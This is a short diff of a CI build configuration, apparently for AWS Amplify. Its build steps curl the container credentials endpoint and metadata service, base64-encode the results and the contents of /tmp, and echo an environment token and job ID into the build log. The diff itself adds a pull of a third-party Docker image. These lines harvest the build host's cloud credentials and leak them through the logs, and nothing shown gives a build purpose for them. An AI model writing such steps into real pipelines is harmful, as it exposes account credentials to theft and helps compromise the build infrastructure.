@@ -10,6 +10,7 @@ frontend:
         - echo "[!] Doing stuff"
         - echo $(ls -la /tmp | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
+        - docker pull rpheuts/aemiliacontainernode10:latest
         - echo "Env token=$AWS_ENVIRONMENT_TOKEN"
         - echo "Build no=$AWS_JOB_ID"
         - curl 169.254.170.2/v2/metadata -v 
